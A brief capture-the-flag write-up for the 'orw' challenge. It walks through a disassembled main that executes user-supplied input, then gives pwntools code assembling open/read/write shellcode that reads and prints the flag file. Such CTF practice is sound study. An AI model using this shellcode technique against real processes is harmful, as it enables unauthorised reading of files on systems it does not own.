# orw

Let's analyze the main
```
0x08048548 <+0>:     lea    ecx,[esp+0x4]           // First argumnet
0x0804854c <+4>:     and    esp,0xfffffff0
0x0804854f <+7>:     push   DWORD PTR [ecx-0x4]     // Push first argument
0x08048552 <+10>:    push   ebp
0x08048553 <+11>:    mov    ebp,esp
0x08048555 <+13>:    push   ecx
0x08048556 <+14>:    sub    esp,0x4
0x08048559 <+17>:    call   0x80484cb <orw_seccomp> // Call to this function with first argumnet
0x0804855e <+22>:    sub    esp,0xc                 // The function sets current thread settings
0x08048561 <+25>:    push   0x80486a0               // "Give me your shellcode::"
0x08048566 <+30>:    call   0x8048380 <printf@plt>  // Print prompt
0x0804856b <+35>:    add    esp,0x10
0x0804856e <+38>:    sub    esp,0x4
0x08048571 <+41>:    push   0xc8
0x08048576 <+46>:    push   0x804a060               // Shell code pointer
0x0804857b <+51>:    push   0x0
0x0804857d <+53>:    call   0x8048370 <read@plt>    // Read stdin and save in shell code pointer
0x08048582 <+58>:    add    esp,0x10
0x08048585 <+61>:    mov    eax,0x804a060           // Move shell code to eax
0x0804858a <+66>:    call   eax                     // Call eax
0x0804858c <+68>:    mov    eax,0x0                 // Cleanup
0x08048591 <+73>:    mov    ecx,DWORD PTR [ebp-0x4]
0x08048594 <+76>:    leave
0x08048595 <+77>:    lea    esp,[ecx-0x4]
0x08048598 <+80>:    ret

```

The program reads a char buffer from stdin and calls it as a function. We need to
pass the shell code, as the prompt suggests. I tries with a defaut shellcode but
It didn't work (remember to set the right context on python).
The challenge states that I can only use `read`, `oepn` and `write`, so I need
to create an assembly function that opend the flag, reads it and writes it to stdout:

```python
shell_code = asm('\n'.join([
# Open file
'push %d' % u32('ag\0\0'),
'push %d' % u32('w/fl'),
'push %d' % u32('e/or'),
'push %d' % u32('/hom'), # Flag path
'mov edx, 0',   # Mode
'mov ecx, 0',   # Open syscall flag
'mov ebx, esp', # Buffer
'mov eax, 5',   # Open syscall number
'int 0x80',

# Read file
'mov edx, 128', # Count
'mov ecx, esp', # Buffer
'mov ebx, eax', # fd
'mov eax, 3',   # Read syscall number
'int 0x80',

# Frite to stdout
'mov edx, eax', # Count
'mov ecx, esp', # Buffer
'mov ebx, 1',   # fd
'mov eax, 4',   # Write syscall number
'int 0x80',
]))

target.sendafter(b":", shell_code)
```

And that's it! I needed to look this up on a writeup because I couldn't write
my own function. I tried compiling a C file with the output was overcomplicated,
to solve this challenge I should have read the linux calls manual and filled
the registers.
